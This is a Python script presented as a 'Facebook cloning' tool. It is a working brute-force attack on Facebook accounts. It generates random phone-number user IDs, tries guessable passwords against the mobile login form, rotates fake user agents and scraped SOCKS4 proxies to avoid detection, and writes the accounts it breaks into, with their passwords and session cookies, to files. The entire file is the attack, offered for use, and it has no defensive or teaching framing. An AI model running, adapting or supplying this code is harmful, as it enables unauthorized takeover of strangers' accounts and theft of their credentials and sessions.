import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
import os
try:
    import requests
except ImportError:
    os.system('pip install requests')
    print('Installing requests ')

try:
    import concurrent.futures
except ImportError:
    os.system('pip install futures')
    print('Installing futures ')

try:
    import bs4
except ImportError:
    os.system('pip install bs4')
    print('Installing bs4')  

def lo(word):
    muhib = ["[\x1b[1;92m■\x1b[0m□□□□□□□□□]","[\x1b[1;96m■■\x1b[0m□□□□□□□□]", "[\x1b[1;92m■■■\x1b[0m□□□□□□□]", "[\x1b[1;96m■■■■\x1b[0m□□□□□□]", "[\x1b[1;92m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;92m■■■■■■■\x1b[0m□□□]", "[\x1b[1;96m■■■■■■■■\x1b[0m□□]", "[\x1b[1;92m■■■■■■■■■\x1b[0m□]", "[\x1b[1;96m■■■■■■■■■■\x1b[0m]"]
    for i in range(1):
        for x in range(len(muhib)):
            sys.stdout.write(('\r{}{}').format(str(word), muhib[x]))
            time.sleep(0.3)
            sys.stdout.flush()

RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#
im = ("MUHIB-143-")
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
loop = 0
oks = []
cps = []
ugen3=[]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
#
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
ugen = []
for sat in range(1000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen3.append(uaku2)
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen2.append(uaku2)
for xd in range(3000):
    aa='Mozilla/5.0 (iPhone; CPU iPhone OS'
    b=random.choice(['6','7','8','9','10','11','12','13','14','15','16'])
    c='like Mac OS X)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/605.1.15 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile/15E148 Safari/537.36'
    uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku)

def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0

logo = ("""\033[0;92m  ███    ███[1;97m ██     ██[1;97m ██   ██[1;97m ██[1;97m ██████ 
  [1;92m████  ████[1;97m ██     ██[1;97m ██   ██[1;97m ██[1;97m ██   ██
  [1;92m██ ████ ██[1;97m ██     ██[1;97m ███████[1;97m ██[1;97m ██████   
  [1;92m██  ██  ██[1;97m ██     ██[1;97m ██   ██[1;97m ██[1;97m ██   ██
  [1;92m██      ██[1;97m █████████[1;97m ██   ██[1;97m ██[1;97m ██████
[1;92m╔══\033[1;90m########################################\033[1;92m══╗[1;92m
[1;92m╠══\033[1;91m[>] [1;96mDEVOLPER\033[1;92m════════════\033[1;96mMUHIB-143 [1;92m        ║
[1;92m╠══\033[1;91m[>] [1;92mFACEBOOK\033[1;96m════════════\033[1;92m/its.muhib.7 [1;92m     ║
[1;92m╠══\033[1;91m[>] [1;93mGITHUB\033[1;92m══════════════\033[1;93mMUHIB-143[1;92m         ║
[1;92m╠══\033[1;91m[>] [1;95mTOOLS\033[1;96m═══════════════\033[1;95mFACEBOOK CLONING[1;92m  ║
[1;92m╚══\033[1;90m########################################\033[1;92m══╝
    """)

def Main():
    user=[]
    os.system('clear')
    os.system('git pull')
    os.system('clear')
    print(logo)
    #os.system('xdg-open https://www.facebook.com/its.muhib.7')
    print(' \033[1;91m[>] \033[1;96mEXAMPLE : \033[1;92m017 \033[1;91m| \033[1;92m018\033[1;91m | \033[1;92m 019\033[1;91m | \033[1;92m 016')
    print("\033[1;32m ->->->->->->->->->->->->->->->->->->->->->->->")
    code = input(' \033[1;91m[>] \033[1;96mCRACKING CODE : \033[1;92m')
    name = ''.join(random.choice(string.digits) for _ in range(0))
    cod = ''.join(random.choice(string.digits) for _ in range(0))
    os.system('clear')
    print(logo)
    #os.system('xdg-open https://github.com/MUHIB-143/')
    print(' \033[1;91m[>] \033[1;96mEXAMPLE :   \033[1;92m10000 \033[1;91m| \033[1;92m20000 \033[1;91m| \033[1;92m30000\033[1;91m | \033[1;92m50000 ')
    print("\033[1;32m ->->->->->->->->->->->->->->->->->->->->->->->")
    limit = int(input(' \033[1;91m[>]\033[1;96m CRACK LIMIT : \033[1;92m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
        print(f'\033[1;96m╔══\033[1;91m[>]\033[1;92mYOUR CUNTRY \033[1;97m     : \033[1;96m'+country)
        print(f'\033[1;96m╠══\033[1;91m[>]\033[1;91[\033[1;90-\033[1;91]\033[1;92mUSEING NETWORK \033[1;97m  : \033[1;96m'+network)
        print(f'\033[1;96m╠══\033[1;91m[>]\033[1;91[\033[1;90-\033[1;91]\033[1;92mYOR IP ADDRESS \033[1;97m  : \033[1;96m'+ips)
        print(f'\033[1;96m╠══\033[1;91m[>]\033[1;91[\033[1;90-\033[1;91]\033[1;92mCRAKING LIMIT   \033[1;97m : \033[1;96m'+tl)
        print(f'\033[1;96m╠══\033[1;91m[>]\033[1;91[\033[1;90-\033[1;91]\033[1;92mCRAKING SIM CODE\033[1;97m : \033[1;96m'+code)
        print(f'\033[0;96m╚══\033[1;91m[>]\033[1;91[\033[1;90-\033[1;91]\x1b[1;92mUSE AIRPLANE MODE FOR BETTER RESULT')
        print('\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for love in user:
            uid = code+name+cod+love
            pwx = [(code+love), (pow), (love),(love[2:]), ("FREE FIRE","free fire","Free Fire","Bangladesh",)]
            asha.submit(MUHIB,uid,pwx,tl)
    print('-------------------')
    print(' [~] WORK IS DONE BABE')
    print(' [+] Ids saved in MUHIB-OK.txt,-CP.txt')
    print('-------------------')
def MUHIB(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            max = random.choice(ugen)
            ff = random.choice(ugen3)
            session = requests.Session()
            sys.stdout.write('\r\033[1;90m[\033[1;92mAI R :%s\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(len(cps),loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____MUHIB-143______#
            header_freefb = {'authority': 'x.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent':max}
            lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f"\x1b[1;32m[MUHIB-💚]  {cid} - {ps}          ")
                print(f"\033[1;91m[>]\033[1;92m=COOKIES : \033[1;96m{coki}")
                open('/sdcard/MUHIB-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[1;32m[MUHIB-💚] {uid} | {ps}   ")
                print(f"\033[1;92m=[💙]=COOKIES : {max}")
                open('/sdcard/MUHIB-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
Main()

